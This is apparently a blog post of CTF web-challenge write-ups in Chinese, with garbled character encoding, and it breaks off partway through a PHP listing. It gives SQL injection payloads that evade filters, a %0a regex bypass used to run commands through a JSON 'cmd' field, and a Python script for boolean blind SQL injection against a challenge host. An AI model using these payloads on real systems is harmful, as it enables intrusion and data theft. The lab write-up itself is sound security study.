<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=<span class="hljs-string">&quot;web1&quot;</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/BOGXTMWDKOVT3N28.png" srcset="/img/loading.gif" lazyload></p>
<p>å› ä¸ºå…³é”®å­—è¢«ç¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥çˆ†å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿™ä¸€æ­¥éª¤ç›´æ¥é€šè¿‡è¡¨æ¥çˆ†å€¼<br>å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼šä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼<br>æ— åˆ—åæ³¨å…¥</p>
<ol>
<li><p>å¦‚æœinformation_schemaè¢«WAF,å¾—åˆ°è¡¨åä¹‹åä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼.<br><img src="/images/2016410-20200519163717474-1767458536.png" srcset="/img/loading.gif" lazyload></p>
</li>
<li><p>ä¹‹åå°±å¯ä»¥åˆ©ç”¨æ•°å­—æ¥å¯¹åº”ç›¸åº”çš„åˆ—,è¿›è¡ŒæŸ¥è¯¢<br><img src="/images/2016410-20200519164320071-1957869897.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>â€ƒè¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹:</p>
<p>1.åˆ—åéœ€è¦ç”¨&#96;&#96;åŒ…è£¹èµ·æ¥<br>2.ä½¿ç”¨å­æŸ¥è¯¢çš„æ—¶å€™,å³ä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­,å†…å±‚æŸ¥è¯¢çš„ç»“æœå¯ä»¥ä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„æ¡ä»¶,å†…å±‚æŸ¥è¯¢åˆ°çš„ç»“æœéœ€è¦èµ·ä¸€ä¸ªåˆ«å(as)</p>
<ol start="3">
<li>å¦‚æœåå¼•å·&#96;&#96;è¢«è¿‡æ»¤,å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼.<br><img src="/images/2016410-20200519164947664-637568242.png" srcset="/img/loading.gif" lazyload><br>ç°åœ¨çš„æ€è·¯å°±æ˜æœ—äº†<br>payload<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>/**/as/**/a,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)heihei),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>ä»£ç è§£æ</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(`<span class="hljs-number">3</span>`)</span></span><br></code></pre></td></tr></table></figure>
<p>ä¸Šé¢è¡¨ç¤ºåˆ—ä¸º3</p>
<p>heiheiheiè¡¨ç¤ºæ´¾ç”Ÿè¡¨çš„åˆ«åï¼Œåå­—éšæ„<br><img src="/images/I1B1KP1JAETRBPE9A.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">æ— åˆ—åæ³¨å…¥æ€»ç»“</a></p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>é¢˜ç›®è¯´è¦ä»¥ JSON æ ¼å¼è¾“å…¥å‘½ä»¤<br>è€ŒJSON éœ€è¦ç»™ä¸€ä¸ªé”®å€¼å¯¹<br>æ ¼å¼ä¸º</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;heiheihei&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>å…ˆè¾“å…¥</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOG2DW2SH1II1WFM.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰å›æ˜¾ï¼Œé”™è¯¯<br>å°è¯•ä½¿ç”¨{â€œcmdâ€:â€cat index.phpâ€} , è¿”å›: Hacking attempt detected ä¼°è®¡è¿‡æ»¤äº†cat ã€‚<br>dirsearchä»€ä¹ˆéƒ½æ²¡æ‰«å‡ºæ¥<br>çœ‹äº†çœ‹å¤§ä½¬çš„wpï¼Œè¿™é¢˜åº”è¯¥æ˜¯ä¼šç»™æºä»£ç çš„</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p>ä»£ç ä¸­ä½¿ç”¨putenv(â€˜PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jailâ€™); é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ä¸äº† cat ä¹Ÿæœ‰å¯èƒ½æ˜¯åœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p>
<p>å› ä¸ºè¿™äº›å‘½ä»¤å®é™…ä¸Šæ˜¯å­˜æ”¾åœ¨ç‰¹å®šç›®å½•ä¸­å°è£…å¥½çš„ç¨‹åºï¼ŒPATHç¯å¢ƒå˜é‡å°±æ˜¯å­˜æ”¾è¿™äº›ç‰¹å®šç›®å½•çš„è·¯å¾„æ–¹ä¾¿æˆ‘ä»¬å»ç›´æ¥è°ƒç”¨è¿™äº›å‘½ä»¤ï¼Œæ‰€ä»¥æ­¤å¤„éƒ¨åˆ†å‘½ä»¤æˆ‘ä»¬å¾—ä½¿ç”¨å…¶å­˜æ”¾çš„ç»å¯¹è·¯å¾„å»è°ƒç”¨</p>
<p>ç„¶åå°±æ˜¯æ­£åˆ™åŒ¹é…çš„ç»•è¿‡äº†<br>å¯ä»¥æ³¨æ„åˆ°æ­£åˆ™è¡¨è¾¾å¼é‡‡ç”¨äº†^xxx$çš„æ ¼å¼ï¼ŒåŒæ—¶ä¹Ÿé‡‡ç”¨äº†.*è¿™æ ·çš„è´ªå©ªåŒ¹é…ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªæ–¹æ¡ˆæ¥ç»•è¿‡æ­£åˆ™â€”â€”å›æº¯æ¬¡æ•°è¶…é™å’Œåˆ©ç”¨%0aã€‚</p>
<p>åˆ©ç”¨%0aï¼š%0aå¯¹äº^xxx$è¿™ä¸ªæ ¼å¼çš„ç»•è¿‡å¤ªå¸¸è§äº†ï¼Œåªéœ€è¦æ³¨æ„ä¸‹è¡¨è¾¾å¼ä¸­å­˜åœ¨ä¸€æ®µ</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>-\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>F<br></code></pre></td></tr></table></figure>
<p>ä¼šåŒ¹é…ä¸€ä¸ª%0aï¼Œä½†å¤šåœ¨payloadå‰ååŠ å‡ ä¸ª%0aå°±è¡Œäº†ã€‚<br><img src="/images/VD0G2K3MS8WJMY0.png" srcset="/img/loading.gif" lazyload><br><img src="/images/20201203222019541.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹ç°åœ¨èƒ½ä¸èƒ½è¡Œ</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/QC88QV83GL7BO.png" srcset="/img/loading.gif" lazyload><br>æ ¹ç›®å½•ä¸­æ²¡æœ‰flag<br>ç”¨findæŸ¥æ‰¾</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰æŠ¥é”™ä½†ä¹Ÿæ²¡æœ‰æ˜¾ç¤ºï¼Œé‚£ä¹ˆè¯´è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹ä¹Ÿæ²¡æœ‰find</p>
<p><strong>Linuxå‘½ä»¤çš„ä½ç½®ï¼š&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</strong><br><img src="/images/Q2BO12RTCT42RURJXEVW.png" srcset="/img/loading.gif" lazyload><br>åœ¨&#x2F;usr&#x2F;binä¸‹æ‰¾åˆ°äº†find<br>è¿™æ ·æ¥ä½¿ç”¨</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/usr/bin/find / -name flag*&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/KXA7MY8AXFZUXW.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°äº†flagçš„è·¯å¾„<br><img src="/images/S73VKNZ1Z1VDVZYA.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°catçš„è·¯å¾„</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/B4QC95042UQCY2WB.png" srcset="/img/loading.gif" lazyload><br>å†çœ‹çœ‹ç¯å¢ƒå˜é‡&#x2F;home&#x2F;rceservice&#x2F;jailä¸‹æœ‰ä»€ä¹ˆ<br><img src="/images/XKOFAHMGNI3P7XQAKZOOW.png" srcset="/img/loading.gif" lazyload><br>æ˜¯lsï¼Œè§£é‡Šäº†ä¸ºå•¥åˆšå¼€å§‹èƒ½ç”¨lsçš„åŸå› </p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br>è¾“å…¥1<br>å›æ˜¾Hi admin, your score is: 100<br>æœ€å¤šè¾“åˆ°4<br>ç›²çŒœsqlæ³¨å…¥<br>è¾“å…¥</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>æ˜¾ç¤ºstudent number not exists.<br>æœ‰å¯èƒ½ç©ºæ ¼æˆ–è€…orè¢«è¿‡æ»¤</p>
<p>å¤šè½®æµ‹è¯•è¿‡åå‘ç°ä»…ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼å³å¯</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>å‘ç°è§„å¾‹ï¼Œå‘½ä»¤é”™è¯¯ä¼šæŠ¥é”™<br>ä½¿ç”¨å¸ƒå°”ç›²æ³¨<br>ç¼–å†™pythonè„šæœ¬æ–¹ä¾¿ä½¿ç”¨</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs hsp">import requests<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) <span class="hljs-comment">// 2</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(schema_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema=<span class="hljs-string">&quot;ctf&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            <span class="hljs-meta"># payload = f&#x27;<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-keyword">if</span>(ascii(substr((select<span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;flag&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)%<span class="hljs-number">23</span>&#x27;</span><br>            payload = f<span class="hljs-string">&#x27;1/**/and/**/if(ascii(substr((select/**/group_concat(value)/**/from/**/ctf.flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>            <span class="hljs-meta"># print(payload)</span><br>            url = f<span class="hljs-string">&quot;http://ac3f56f2-dc89-4ab5-a066-b6f2d94da972.node5.buuoj.cn:81/?stunum=&#123;payload&#125;&quot;</span><br>            <span class="hljs-meta">#print(url)</span><br>            <span class="hljs-meta"># data=&#123;</span><br>            <span class="hljs-meta"># <span class="hljs-string">&quot;&quot;</span>:f<span class="hljs-string">&quot;admin&#x27; and &#123;payload&#125;#&quot;</span>,</span><br>            <span class="hljs-meta">#</span><br>            <span class="hljs-meta"># &#125;</span><br>            r = requests.get(url=url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;admin&#x27;</span> in r.text:<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            result += chr(low)<br>            <span class="hljs-keyword">print</span>(result)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>


<h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æºä»£ç é‡Œæ˜¯æœ‰æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;!--<br><span class="hljs-regexp">//</span><span class="hljs-number">1</span>st<br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<span class="hljs-regexp">//</span>å¯ä»¥ç†è§£ä¸ºè·å–è¾“å…¥çš„å­—ç¬¦ä¿¡æ¯,è·å–çš„æ˜¯?åé¢çš„å€¼<br><br> <span class="hljs-keyword">if</span>( substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<span class="hljs-regexp">//</span>substr_countè·å–å­—ç¬¦çš„å‡ºç°æ¬¡æ•°<br>    die(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    echo <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure>
<p>å¼€å§‹ç»•<br>ä»–æ²¡æœ‰å¤§å°å†™çš„æ£€æµ‹%5fç”¨%5Fç»•è¿‡<br>ä»¥$ç»“å°¾ä¹Ÿæ²¡æœ‰ç¦ç”¨æ¢è¡Œç¬¦ï¼Œå°±ç”¨%0aç»•è¿‡<br>payload</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?b[u<span class="hljs-meta">%</span><span class="hljs-number">5</span>Fp<span class="hljs-meta">%</span><span class="hljs-number">5</span>Ft=<span class="hljs-number">23333</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure>
<p><img src="/images/H37HXSCW5QM6ZXX.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥å†æºä»£ç å‘ç°ä¸€ä¸ªåŠ å¯†ä¿¡æ¯<br>å¤åˆ¶ç²˜è´´åœ¨æ§åˆ¶å°é‡Œ<br><img src="/images/B8K9LNDE6H7CN95S.png" srcset="/img/loading.gif" lazyload><br>é‚£ä¹ˆPOST Merak,å€¼éšæ„</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span 